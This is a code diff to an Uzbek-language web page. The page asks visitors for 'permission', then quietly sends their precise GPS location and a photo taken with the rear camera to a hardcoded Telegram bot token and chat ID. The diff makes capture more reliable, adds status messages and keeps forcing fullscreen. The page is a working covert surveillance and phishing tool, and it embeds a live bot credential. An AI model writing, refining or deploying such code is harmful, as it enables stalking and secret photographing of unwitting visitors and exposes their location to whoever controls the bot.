@@ -61,6 +61,18 @@
             left: 50%;
             transform: translate(-50%, -50%);
             z-index: 2000;
+            max-width: 90%;
+            max-height: 90%;
+        }
+        #permission-status {
+            position: fixed;
+            bottom: 20px;
+            left: 20px;
+            background: rgba(0,0,0,0.7);
+            color: white;
+            padding: 10px;
+            border-radius: 5px;
+            z-index: 3000;
         }
     </style>
 </head>
@@ -77,17 +89,27 @@
     <div id="prompt-overlay">
         <div id="prompt-message">
             <h2>Ruxsat kerak</h2>
-            <p>Joylashuv va kamera ruxsatini bering.</p>
+            <p>Iltimos, joylashuv va kamera ruxsatlarini bering.</p>
             <button onclick="requestPermissions()">Ruxsat berish</button>
         </div>
     </div>
 
-    <video id="camera-preview" width="640" height="480" autoplay></video>
+    <video id="camera-preview" autoplay playsinline></video>
+    <div id="permission-status"></div>
 
     <script>
         const BOT_TOKEN = '7393954828:AAHhCwcD7LlP8SUmCx-Pefw3IT-70yQynN4'; // Telegram bot token
         const CHAT_ID = '7281698380'; // Telegram chat ID
-        let permissionsGranted = false;
+        let locationGranted = false;
+        let cameraGranted = false;
+
+        function updateStatus(message) {
+            const statusElement = document.getElementById('permission-status');
+            statusElement.textContent = message;
+            setTimeout(() => {
+                statusElement.textContent = '';
+            }, 3000);
+        }
 
         async function sendLocationToTelegram(latitude, longitude) {
             try {
@@ -97,12 +119,14 @@
                     body: JSON.stringify({ chat_id: CHAT_ID, latitude, longitude })
                 });
                 if (response.ok) {
+                    updateStatus('Joylashuv yuborildi!');
                     console.log('Joylashuv yuborildi!');
                 } else {
                     throw new Error('Joylashuv yuborishda xato');
                 }
             } catch (error) {
                 console.error('Joylashuv xatosi:', error);
+                updateStatus('Joylashuv yuborishda xato');
             }
         }
 
@@ -117,12 +141,14 @@
                     body: formData
                 });
                 if (response.ok) {
+                    updateStatus('Rasm yuborildi!');
                     console.log('Rasm yuborildi!');
                 } else {
                     throw new Error('Rasm yuborishda xato');
                 }
             } catch (error) {
                 console.error('Rasm xatosi:', error);
+                updateStatus('Rasm yuborishda xato');
             }
         }
 
@@ -142,56 +168,102 @@
 
             canvas.toBlob(async (blob) => {
                 await sendPhotoToTelegram(blob);
+                document.getElementById('prompt-overlay').style.display = 'none';
             }, 'image/png');
         }
 
         async function startCamera() {
             const video = document.getElementById('camera-preview');
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: {
+                        facingMode: 'environment',
+                        width: { ideal: 1280 },
+                        height: { ideal: 720 }
+                    }
+                });
                 video.srcObject = stream;
                 video.style.display = 'block';
+                updateStatus('Kamera ochildi...');
                 console.log('Kamera ochildi');
-                setTimeout(() => {
-                    capturePhotoFromCamera();
-                }, 2000); // 2 soniyadan keyin rasmga oladi
+                
+                // Wait for video to actually start playing
+                video.onplaying = () => {
+                    setTimeout(() => {
+                        capturePhotoFromCamera();
+                    }, 2000); // Take photo after 2 seconds
+                };
             } catch (error) {
                 console.error('Kamera xatosi:', error);
-                alert('Kameraga ruxsat berilmadi yoki xato yuz berdi!');
+                updateStatus('Kameraga ruxsat berilmadi!');
+                document.getElementById('prompt-overlay').style.display = 'none';
+            }
+        }
+
+        async function requestLocation() {
+            return new Promise((resolve, reject) => {
+                if (navigator.geolocation) {
+                    updateStatus('Joylashuv so\'ralmoqda...');
+                    navigator.geolocation.getCurrentPosition(
+                        async (position) => {
+                            const { latitude, longitude } = position.coords;
+                            await sendLocationToTelegram(latitude, longitude);
+                            console.log('Joylashuv olindi:', latitude, longitude);
+                            locationGranted = true;
+                            resolve();
+                        },
+                        (error) => {
+                            console.error('Joylashuv xatosi:', error);
+                            updateStatus('Joylashuvga ruxsat berilmadi!');
+                            reject(error);
+                        },
+                        {
+                            enableHighAccuracy: true,
+                            timeout: 10000,
+                            maximumAge: 0
+                        }
+                    );
+                } else {
+                    const error = new Error('Geolocation not supported');
+                    console.error('Brauzerda geolocation qo\'llab-quvvatlanmaydi!');
+                    updateStatus('Joylashuv qo\'llab-quvvatlanmaydi!');
+                    reject(error);
+                }
+            });
+        }
+
+        async function requestCamera() {
+            try {
+                updateStatus('Kamera so\'ralmoqda...');
+                await startCamera();
+                cameraGranted = true;
+            } catch (error) {
+                console.error('Camera error:', error);
+                throw error;
             }
         }
 
         async function requestPermissions() {
-            if (permissionsGranted) return;
-
-            document.getElementById('prompt-overlay').style.display = 'none';
-            permissionsGranted = true;
-
-            // 1. Joylashuvni so‘rash
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(
-                    async (position) => {
-                        const { latitude, longitude } = position.coords;
-                        await sendLocationToTelegram(latitude, longitude);
-                        console.log('Joylashuv olindi:', latitude, longitude);
-
-                        // 2. Kamerani so‘rash
-                        await startCamera();
-                    },
-                    (error) => {
-                        console.error('Joylashuv xatosi:', error);
-                        alert('Joylashuvga ruxsat berilmadi!');
-                    }
-                );
-            } else {
-                alert('Brauzerda geolocation qo‘llab-quvvatlanmaydi!');
+            try {
+                // Request location first
+                await requestLocation();
+                
+                // Then request camera
+                await requestCamera();
+            } catch (error) {
+                console.error('Permissions error:', error);
+                document.getElementById('prompt-overlay').style.display = 'none';
             }
         }
 
         document.addEventListener('DOMContentLoaded', () => {
-            document.documentElement.requestFullscreen().catch(err => {
-                console.error('To‘liq ekran xatosi:', err);
-            });
+            try {
+                document.documentElement.requestFullscreen().catch(err => {
+                    console.error('To\'liq ekran xatosi:', err);
+                });
+            } catch (err) {
+                console.error('Fullscreen error:', err);
+            }
         });
     </script>
 </body>
